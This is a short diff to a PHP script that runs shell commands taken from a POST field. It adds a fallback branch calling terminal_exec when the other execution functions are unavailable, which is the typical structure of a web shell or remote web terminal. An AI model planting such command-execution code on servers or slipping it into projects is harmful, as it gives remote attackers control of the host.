@@ -77,7 +77,11 @@ if (isset( $_POST['command'])):
 			$output = implode("" , $output);
 		}
 
-
+		// Try: terminal_exec
+		else if(function_exists('terminal_exec'))
+		{
+			$output = terminal_exec($command) ;
+		}
 		// No function exists
 		else
 		{
